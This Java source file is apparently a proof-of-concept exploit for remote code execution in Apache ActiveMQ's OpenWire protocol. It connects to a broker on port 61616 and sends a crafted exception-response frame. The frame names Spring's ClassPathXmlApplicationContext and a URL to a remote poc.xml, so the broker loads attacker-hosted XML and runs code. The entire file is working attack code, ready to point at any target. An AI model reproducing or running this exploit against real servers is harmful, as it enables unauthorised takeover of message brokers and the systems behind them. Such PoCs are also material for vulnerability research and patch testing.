import java.io.*;
import java.net.Socket;

public class ActiveMQ {
    public static void main(final String[] args) throws Exception {
        System.out.println("[*] Poc for ActiveMQ openwire protocol rce");
        String ip = "127.0.0.1";
        int port = 61616;
        String pocxml= "http://127.0.0.1:8000/poc.xml";
        Socket sck = new Socket(ip, port);
        OutputStream os = sck.getOutputStream();
        DataOutputStream out = new DataOutputStream(os);
        out.writeInt(0); //无所谓
        out.writeByte(31); //dataType ExceptionResponseMarshaller
        out.writeInt(1); //CommandId
        out.writeBoolean(true); //ResponseRequired
        out.writeInt(1); //CorrelationId
        out.writeBoolean(true);
        //use true -> red utf-8 string
        out.writeBoolean(true);
        out.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
        //use true -> red utf-8 string
        out.writeBoolean(true);
        out.writeUTF(pocxml);
        //call org.apache.activemq.openwire.v1.BaseDataStreamMarshaller#createThrowable cause rce
        out.close();
        os.close();
        sck.close();
        System.out.println("[*] Target\t" + ip + ":" + port);
        System.out.println("[*] XML address\t" + pocxml);
        System.out.println("[*] Payload send success.");
    }
}
